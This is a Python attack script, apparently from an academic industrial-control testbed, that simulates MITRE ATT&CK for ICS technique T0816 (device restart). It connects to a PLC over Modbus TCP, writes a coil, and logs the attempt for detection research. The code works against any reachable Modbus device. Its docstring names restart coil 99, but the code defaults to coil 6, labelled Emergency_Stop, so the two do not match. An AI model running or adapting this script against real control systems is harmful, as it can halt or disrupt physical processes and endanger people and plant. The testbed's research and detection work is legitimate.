#!/usr/bin/env python3
"""
ASCEND-PG attacks/device_restart.py

MITRE ATT&CK for ICS: T0816 — Device Restart/Shutdown.

Simulates an unauthorized device restart by writing a specific coil
value that the PLC interprets as a restart command. In a real ICS
environment, this could cause physical process disruption.

Implementation:
  - Uses pymodbus FC05 (Write Single Coil) to address 99
    (designated "restart" coil in our test PLC configuration)
  - The PLC server treats this as a normal coil write (no actual restart)
  - Detection: Suricata catches the coil write (SID 9000007)

Run this ON THE ATTACKER HOST:
    python3 attacks/device_restart.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[device_restart] ERROR: pymodbus not installed. Run: pip install pymodbus")
    sys.exit(1)

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

RESTART_COIL_ADDRESS = 6  # Emergency_Stop coil in generator template
RESTART_COIL_VALUE = True


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def run_restart(target: str, port: int, unit: int, coil_address: int, log_path: Path) -> bool:
    """Write the restart coil on the target PLC.

    Returns True if the write was accepted (not necessarily executed).
    """
    print(f"[device_restart] Connecting to {target}:{port} (unit={unit})")

    client = ModbusTcpClient(target, port=port, timeout=5)
    if not client.connect():
        print(f"[device_restart] ERROR: Cannot connect to {target}:{port}")
        return False

    try:
        # Write restart coil
        print(f"[device_restart] Writing restart coil at address {coil_address}")
        result = client.write_coil(coil_address, RESTART_COIL_VALUE, slave=unit)

        if result.isError():
            print(f"[device_restart] Coil write returned error: {result}")
            log_event(log_path, {
                "stage": "attack", "technique": "T0816",
                "action": "device_restart_error",
                "target": target, "address": coil_address,
                "error": str(result),
            })
            return False

        print(f"[device_restart] Restart coil written successfully")
        log_event(log_path, {
            "stage": "attack", "technique": "T0816",
            "action": "device_restart",
            "target": target, "address": coil_address,
            "value": RESTART_COIL_VALUE,
        })
        return True

    except Exception as exc:
        print(f"[device_restart] ERROR: {exc}")
        log_event(log_path, {
            "stage": "attack", "technique": "T0816",
            "action": "device_restart_error",
            "target": target, "error": str(exc),
        })
        return False

    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Device Restart (T0816) — writes restart coil on PLC"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address")
    parser.add_argument("-p", "--port", type=int, default=502,
                        help="Modbus TCP port (default: 502)")
    parser.add_argument("-u", "--unit", type=int, default=1,
                        help="Modbus unit/slave ID (default: 1)")
    parser.add_argument("--coil-address", type=int, default=RESTART_COIL_ADDRESS,
                        help=f"Coil address for restart command (default: {RESTART_COIL_ADDRESS})")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0816",
        "action": "device_restart_start",
        "target": args.target,
    })

    success = run_restart(args.target, args.port, args.unit, args.coil_address, log_path)

    log_event(log_path, {
        "stage": "attack", "technique": "T0816",
        "action": "device_restart_end",
        "target": args.target,
        "success": success,
    })

    print(f"\n[device_restart] {'SUCCESS' if success else 'FAILED'}")
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
